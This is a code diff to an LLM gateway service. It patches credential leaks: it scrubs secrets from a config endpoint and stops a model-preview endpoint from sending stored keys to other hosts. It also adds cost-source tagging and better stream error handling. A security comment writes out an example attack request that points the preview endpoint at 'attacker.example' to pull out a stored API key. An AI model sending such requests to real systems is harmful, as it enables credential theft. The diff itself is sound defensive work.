@@ -9,6 +9,7 @@ import type { Dispatcher } from "undici";
 import type {
   ChatCompletionRequest,
   ChatCompletionResponse,
+  ChatProviderFailureRecord,
   ImageAssetInput,
   ImageGenerationRequest,
   ImageGenerationResponse,
@@ -497,8 +498,17 @@ export class LlmService {
       activeModel: this.activeModel,
       providers: Array.from(this.providers.values()).map((provider) => ({
         ...provider,
+        // SECURITY (codex finding #15): The LLM config endpoint serializes
+        // this object. We must strip ALL secret-bearing transport fields,
+        // not just `apiKey` and top-level `headers`. `provider.request` (and
+        // `provider.proxy`, if present in the type) can hold inline
+        // `request.auth.token`, `request.auth.value`, `request.proxy.auth.*`,
+        // and `request.headers` with `Authorization`/`X-API-Key`-style
+        // values. Without scrubbing them, a device/companion token could
+        // read transport credentials that were never apiKey-redacted.
         apiKey: undefined,
         headers: undefined,
+        request: scrubProviderRequestSecrets(provider.request),
       })),
     };
   }
@@ -520,22 +530,42 @@ export class LlmService {
 
   public async previewModels(input: LlmModelPreviewRequest): Promise<LlmModelPreviewResponse> {
     const existing = this.providers.get(input.providerId);
+    // SECURITY (codex finding #25a, #30): The preview endpoint accepts an
+    // arbitrary `baseUrl` and an existing `providerId`. Previously the code
+    // happily fell back to the existing provider's stored apiKey/apiKeyEnv/
+    // keychain entry when the caller omitted a key, even when the caller's
+    // baseUrl pointed at an attacker-controlled host. That turned the
+    // endpoint into a credential-exfil primitive: a lower-privileged actor
+    // who knew a providerId but could not read its key could POST
+    // `{providerId, baseUrl: "https://attacker.example"}` and the gateway
+    // would Authorization-bearer that secret to the attacker.
+    //
+    // We now refuse to inherit secret material when the caller-supplied
+    // baseUrl is on a different host than the existing provider's
+    // configured baseUrl. The caller may still preview an arbitrary baseUrl
+    // — they just have to supply the key themselves.
+    const hostsMatch = previewHostsMatch(existing?.baseUrl, input.baseUrl);
+    const inheritFromExisting = !existing || hostsMatch;
     const provider = normalizeProvider({
       providerId: input.providerId,
       label: existing?.label ?? input.providerId,
       baseUrl: input.baseUrl,
       apiStyle: normalizeProviderApiStyle(input.providerId, input.apiStyle ?? existing?.apiStyle),
       defaultModel: existing?.defaultModel ?? defaultModelForProvider(input.providerId),
-      apiKey: input.apiKey ?? existing?.apiKey,
-      apiKeyEnv: input.apiKeyEnv ?? existing?.apiKeyEnv,
-      request: input.request ?? existing?.request,
-      headers: input.headers ?? existing?.headers,
+      apiKey: input.apiKey ?? (inheritFromExisting ? existing?.apiKey : undefined),
+      apiKeyEnv: input.apiKeyEnv ?? (inheritFromExisting ? existing?.apiKeyEnv : undefined),
+      request: input.request ?? (inheritFromExisting ? existing?.request : undefined),
+      headers: input.headers ?? (inheritFromExisting ? existing?.headers : undefined),
     });
     const explicitPreviewApiKey =
       input.apiKey?.trim() || (input.apiKeyEnv ? this.env[input.apiKeyEnv]?.trim() : undefined);
     const resolved: ResolvedProvider = {
       provider,
-      apiKey: explicitPreviewApiKey || this.resolveApiKey(provider),
+      // When the caller's baseUrl host does not match the configured
+      // provider, do NOT fall back to the keychain — `resolveApiKey`
+      // checks keychain by providerId, which would otherwise return the
+      // saved credential for the configured (matching) host.
+      apiKey: explicitPreviewApiKey || (inheritFromExisting ? this.resolveApiKey(provider) : undefined),
     };
     const fallbackCatalog = buildFallbackModelCatalog(provider.providerId, provider.defaultModel);
 
@@ -853,7 +883,7 @@ export class LlmService {
       }
     }
 
-    return applyEstimatedCostToChatResponse(
+    return applyEstimatedCostToChatResponseWithSource(
       await parseProviderJsonResponse<ChatCompletionResponse>("chat completion", response),
       {
         providerId: resolved.provider.providerId,
@@ -921,7 +951,7 @@ export class LlmService {
     }
 
     for await (const event of streamJsonSseResponse(response)) {
-      yield applyEstimatedCostToStreamChunk(event, {
+      yield applyEstimatedCostToStreamChunkWithSource(event, {
         providerId: resolved.provider.providerId,
         model,
       });
@@ -950,14 +980,14 @@ export class LlmService {
     }
 
     if (codexResponsesProvider && response.body) {
-      return applyEstimatedCostToChatResponse(await collectOpenAiResponsesStreamCompletion(response, model), {
+      return applyEstimatedCostToChatResponseWithSource(await collectOpenAiResponsesStreamCompletion(response, model), {
         providerId: resolved.provider.providerId,
         model,
       });
     }
 
     const json = await parseProviderJsonResponse("responses request", response);
-    return applyEstimatedCostToChatResponse(adaptOpenAiResponsesResponse(json), {
+    return applyEstimatedCostToChatResponseWithSource(adaptOpenAiResponsesResponse(json), {
       providerId: resolved.provider.providerId,
       model,
     });
@@ -987,12 +1017,30 @@ export class LlmService {
       isOpenAICodexResponsesProvider(resolved.provider) || contentType.includes("text/event-stream");
     if (!shouldParseAsSse || !response.body) {
       const json = await parseProviderJsonResponse("responses stream", response);
-      yield applyEstimatedCostToChatResponse(adaptOpenAiResponsesResponse(json), {
+      yield applyEstimatedCostToChatResponseWithSource(adaptOpenAiResponsesResponse(json), {
         providerId: resolved.provider.providerId,
         model,
       });
       return;
     }
+
+    const streamedFunctionCallIndexes = new Map<string, number>();
+    let nextStreamedFunctionCallIndex = 0;
+    const resolveStreamedFunctionCallIndex = (
+      event: Record<string, unknown>,
+      item: Record<string, unknown>,
+    ): number => {
+      const key =
+        firstNonEmptyString(item.call_id, item.id, event.item_id) ?? `anonymous:${nextStreamedFunctionCallIndex}`;
+      const existingIndex = streamedFunctionCallIndexes.get(key);
+      if (existingIndex !== undefined) {
+        return existingIndex;
+      }
+      const assignedIndex = nextStreamedFunctionCallIndex;
+      nextStreamedFunctionCallIndex += 1;
+      streamedFunctionCallIndexes.set(key, assignedIndex);
+      return assignedIndex;
+    };
 
     for await (const event of streamJsonSseResponse(response, { forceSse: shouldParseAsSse })) {
       const eventType = typeof event.type === "string" ? event.type : "";
@@ -1014,6 +1062,7 @@ export class LlmService {
       if (eventType === "response.output_item.done") {
         const item = isRecord(event.item) ? event.item : undefined;
         if (item?.type === "function_call") {
+          const toolCallIndex = resolveStreamedFunctionCallIndex(event, item);
           yield {
             id: String(item.id ?? event.item_id ?? "response"),
             choices: [
@@ -1022,7 +1071,7 @@ export class LlmService {
                 delta: {
                   tool_calls: [
                     {
-                      index: 0,
+                      index: toolCallIndex,
                       id: String(item.call_id ?? item.id ?? "call"),
                       type: "function",
                       function: {
@@ -1041,7 +1090,7 @@ export class LlmService {
 
       if (eventType === "response.completed" && isRecord(event.response)) {
         const adapted = adaptOpenAiResponsesResponse(event.response);
-        yield applyEstimatedCostToStreamChunk(
+        yield applyEstimatedCostToStreamChunkWithSource(
           {
             id: adapted.id,
             model: adapted.model,
@@ -1063,7 +1112,7 @@ export class LlmService {
       }
 
       if (eventType === "response.failed") {
-        throw new Error("responses stream failed");
+        throw buildResponsesStreamFailureError(event);
       }
     }
   }
@@ -1420,6 +1469,126 @@ function normalizeProviderRequestConfig(
     return undefined;
   }
   return normalizedRequest;
+}
+
+// SECURITY (codex finding #25a, #30): Compare the host portion of two
+// provider base URLs. Used by `previewModels` to decide whether the
+// caller-supplied baseUrl is the same provider host as the configured one;
+// if not, inheriting stored secrets is unsafe.
+export function previewHostsMatch(configuredBaseUrl: string | undefined, requestedBaseUrl: string): boolean {
+  if (!configuredBaseUrl?.trim()) {
+    return true;
+  }
+  try {
+    const configured = new URL(configuredBaseUrl).host.toLowerCase();
+    const requested = new URL(requestedBaseUrl).host.toLowerCase();
+    return configured === requested;
+  } catch {
+    return false;
+  }
+}
+
+// SECURITY (codex finding #15): Strip every secret-bearing field from a
+// provider request config before serializing it for the LLM config
+// endpoint. The endpoint is reachable to authenticated principals
+// including device/companion tokens, and the raw `provider.request` object
+// previously contained inline `auth.token`, `auth.value`, `proxy.auth.*`,
+// and `headers["Authorization"]` values.
+//
+// We KEEP the non-secret fields (envVar names, tls.caFingerprint, proxy
+// URL) so the UI can show which transport is in use, but never the values
+// themselves. Env-var name fields are non-secret on their own — they merely
+// tell the operator which env variable holds the real value.
+function scrubProviderRequestSecrets(
+  request: LlmProviderRequestConfig | undefined,
+): LlmProviderRequestConfig | undefined {
+  if (!request) {
+    return undefined;
+  }
+  const cleaned: LlmProviderRequestConfig = {};
+  if (request.auth) {
+    if (request.auth.type === "bearer") {
+      const auth: LlmProviderRequestAuthConfig = { type: "bearer" };
+      if (request.auth.headerName) {
+        auth.headerName = request.auth.headerName;
+      }
+      if (request.auth.tokenEnv) {
+        // env-var NAME is fine to disclose; the value of the env var is not.
+        auth.tokenEnv = request.auth.tokenEnv;
+      }
+      // Drop `auth.token` (inline literal secret).
+      cleaned.auth = auth;
+    } else if (request.auth.type === "header") {
+      const auth: LlmProviderRequestAuthConfig = {
+        type: "header",
+        headerName: request.auth.headerName,
+      };
+      if (request.auth.scheme) {
+        auth.scheme = request.auth.scheme;
+      }
+      if (request.auth.valueEnv) {
+        auth.valueEnv = request.auth.valueEnv;
+      }
+      // Drop `auth.value` (inline literal secret).
+      cleaned.auth = auth;
+    }
+  }
+  if (request.proxy) {
+    const proxyClean: NonNullable<LlmProviderRequestConfig["proxy"]> = { url: request.proxy.url };
+    if (request.proxy.bypassHosts && request.proxy.bypassHosts.length > 0) {
+      proxyClean.bypassHosts = [...request.proxy.bypassHosts];
+    }
+    if (request.proxy.auth) {
+      if (request.proxy.auth.type === "bearer") {
+        const auth: LlmProviderRequestProxyAuthConfig = { type: "bearer" };
+        if (request.proxy.auth.headerName) {
+          auth.headerName = request.proxy.auth.headerName;
+        }
+        if (request.proxy.auth.tokenEnv) {
+          auth.tokenEnv = request.proxy.auth.tokenEnv;
+        }
+        proxyClean.auth = auth;
+      } else if (request.proxy.auth.type === "header") {
+        const auth: LlmProviderRequestProxyAuthConfig = {
+          type: "header",
+          headerName: request.proxy.auth.headerName,
+        };
+        if (request.proxy.auth.scheme) {
+          auth.scheme = request.proxy.auth.scheme;
+        }
+        if (request.proxy.auth.valueEnv) {
+          auth.valueEnv = request.proxy.auth.valueEnv;
+        }
+        proxyClean.auth = auth;
+      }
+    }
+    if (request.proxy.tls) {
+      proxyClean.tls = scrubTlsConfig(request.proxy.tls);
+    }
+    cleaned.proxy = proxyClean;
+  }
+  if (request.tls) {
+    cleaned.tls = scrubTlsConfig(request.tls);
+  }
+  // `request.headers` is intentionally dropped — its keys are arbitrary and
+  // every Authorization/Cookie/X-API-Key header value would otherwise leak.
+  return Object.keys(cleaned).length > 0 ? cleaned : undefined;
+}
+
+// Helper: TLS config in this contract has only non-secret fields (paths
+// and flags), but file paths can reveal local layout, so we keep only the
+// shape that's safe to surface to ordinary authenticated callers.
+function scrubTlsConfig(tls: LlmProviderRequestTlsConfig): LlmProviderRequestTlsConfig {
+  const cleaned: LlmProviderRequestTlsConfig = {};
+  if (typeof tls.insecureSkipVerify === "boolean") {
+    cleaned.insecureSkipVerify = tls.insecureSkipVerify;
+  }
+  if (tls.serverName) {
+    cleaned.serverName = tls.serverName;
+  }
+  // caCertPath / clientCertPath / clientKeyPath omitted — they reveal local
+  // filesystem layout and indirectly hint at which secrets are in play.
+  return cleaned;
 }
 
 function normalizeProviderApiStyle(providerId: string, apiStyle: LlmApiStyle | undefined): LlmApiStyle {
@@ -2265,7 +2434,7 @@ async function collectOpenAiResponsesStreamCompletion(
       return completion;
     }
     if (eventType === "response.failed") {
-      throw new Error("responses stream failed");
+      throw buildResponsesStreamFailureError(event);
     }
   }
 
@@ -2282,6 +2451,110 @@ async function collectOpenAiResponsesStreamCompletion(
       },
     ],
   };
+}
+
+function applyEstimatedCostToChatResponseWithSource(
+  response: ChatCompletionResponse,
+  input: { providerId?: string; model?: string },
+): ChatCompletionResponse {
+  const providerReportedCost = hasUsageCost(response.usage);
+  return annotateChatResponseUsageCostSource(
+    applyEstimatedCostToChatResponse(response, input),
+    providerReportedCost ? "provider_reported" : "estimated",
+  );
+}
+
+function applyEstimatedCostToStreamChunkWithSource(
+  chunk: Record<string, unknown>,
+  input: { providerId?: string; model?: string },
+): Record<string, unknown> {
+  const providerReportedCost = hasUsageCost(chunk.usage);
+  return annotateStreamChunkUsageCostSource(
+    applyEstimatedCostToStreamChunk(chunk, input),
+    providerReportedCost ? "provider_reported" : "estimated",
+  );
+}
+
+function annotateChatResponseUsageCostSource(
+  response: ChatCompletionResponse,
+  source: "provider_reported" | "estimated",
+): ChatCompletionResponse {
+  if (!isRecord(response.usage) || !hasUsageCost(response.usage) || hasUsageCostSource(response.usage)) {
+    return response;
+  }
+  return {
+    ...response,
+    usage: {
+      ...response.usage,
+      cost_source: source,
+    },
+  };
+}
+
+function annotateStreamChunkUsageCostSource(
+  chunk: Record<string, unknown>,
+  source: "provider_reported" | "estimated",
+): Record<string, unknown> {
+  if (!isRecord(chunk.usage) || !hasUsageCost(chunk.usage) || hasUsageCostSource(chunk.usage)) {
+    return chunk;
+  }
+  return {
+    ...chunk,
+    usage: {
+      ...chunk.usage,
+      cost_source: source,
+    },
+  };
+}
+
+function hasUsageCost(usage: unknown): boolean {
+  if (!isRecord(usage)) {
+    return false;
+  }
+  return readFiniteNumber(usage.cost_usd) !== undefined || readFiniteNumber(usage.total_cost_usd) !== undefined;
+}
+
+function hasUsageCostSource(usage: Record<string, unknown>): boolean {
+  return Boolean(firstNonEmptyString(usage.cost_source, usage.costSource));
+}
+
+function buildResponsesStreamFailureError(event: Record<string, unknown>): Error {
+  const provider = readResponsesProviderFailure(event);
+  const details = [provider?.code, provider?.message].filter((value): value is string => Boolean(value));
+  const message = details.length > 0 ? `responses stream failed: ${details.join(" - ")}` : "responses stream failed";
+  const error = provider ? new Error(message, { cause: provider }) : new Error(message);
+  if (provider) {
+    (error as Error & { providerFailure?: ChatProviderFailureRecord }).providerFailure = provider;
+  }
+  return error;
+}
+
+function readResponsesProviderFailure(event: Record<string, unknown>): ChatProviderFailureRecord | undefined {
+  const response = isRecord(event.response) ? event.response : undefined;
+  const responseError = isRecord(response?.error) ? response.error : undefined;
+  const eventError = isRecord(event.error) ? event.error : undefined;
+  const stringError = typeof event.error === "string" ? event.error : undefined;
+  const provider: ChatProviderFailureRecord = {
+    code: firstNonEmptyString(responseError?.code, eventError?.code, event.code),
+    message: firstNonEmptyString(responseError?.message, eventError?.message, event.message, stringError),
+    status: firstNonEmptyString(response?.status, event.status),
+    responseId: firstNonEmptyString(response?.id, event.response_id, event.id),
+    type: firstNonEmptyString(responseError?.type, eventError?.type),
+  };
+  return Object.values(provider).some(Boolean) ? provider : undefined;
+}
+
+function readFiniteNumber(value: unknown): number | undefined {
+  if (typeof value === "number" && Number.isFinite(value)) {
+    return value;
+  }
+  if (typeof value === "string" && value.trim().length > 0) {
+    const parsed = Number(value);
+    if (Number.isFinite(parsed)) {
+      return parsed;
+    }
+  }
+  return undefined;
 }
 
 function isOpenAIGpt5Model(model: string): boolean {
@@ -2560,6 +2833,19 @@ function dedupeToolCalls<T extends { id: string }>(toolCalls: T[]): T[] {
 
 function isRecord(value: unknown): value is Record<string, unknown> {
   return Boolean(value) && typeof value === "object" && !Array.isArray(value);
+}
+
+function firstNonEmptyString(...values: unknown[]): string | undefined {
+  for (const value of values) {
+    if (typeof value !== "string") {
+      continue;
+    }
+    const trimmed = value.trim();
+    if (trimmed) {
+      return trimmed;
+    }
+  }
+  return undefined;
 }
 
 function toPlainRecord(value: unknown): Record<string, unknown> | undefined {
